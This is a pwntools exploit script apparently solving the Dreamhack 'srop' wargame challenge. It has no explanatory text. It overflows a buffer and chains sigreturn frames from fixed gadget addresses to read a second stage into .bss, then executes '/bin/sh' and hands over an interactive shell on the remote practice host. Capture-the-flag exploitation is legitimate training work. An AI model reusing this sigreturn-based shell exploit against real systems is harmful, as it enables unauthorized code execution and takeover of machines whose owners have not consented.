#!/usr/bin/env python3
from pwn import *

exe = ELF('srop', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

s= lambda data : p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *main
            
        ''')

if args.REMOTE:
    p = remote('host3.dreamhack.games',19982)
else:
    p = process(exe.path)


GDB()
bss_adres= exe.bss()
log.info(b'bss_address: '+ hex(bss_adres).encode())

input()
pop_rax_syscall=0x00000000004004eb
ret_address = 0x00000000004003de
syscall= 0x00000000004004ec
frame = SigreturnFrame(arch='amd64')
frame.rsp = bss_adres-8
frame.rip =  syscall 
frame.rax= 0 
frame.rdi = 0
frame.rsi= 0x601028
frame.rdx= 0x1000


payload =flat([
           b'A'*16,
           bss_adres,  
           pop_rax_syscall,
           15,
           bytes(frame),
])

s(payload)

payload =flat([
           pop_rax_syscall,
           0x0f,
           '/bin/sh',
           '\x00',
            
])

payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0x601038)
payload += p64(0)
payload += p64(0x601028)
payload += p64(0)
payload += p64(0)
payload += p64(0x3b)
payload += p64(0)
payload += p64(0x601028)
payload += p64(syscall)
payload += p64(0)
payload += p16(0x33)
payload += p16(0)
payload += p16(0)
payload += p16(0x2b)
s(payload)

p.interactive()
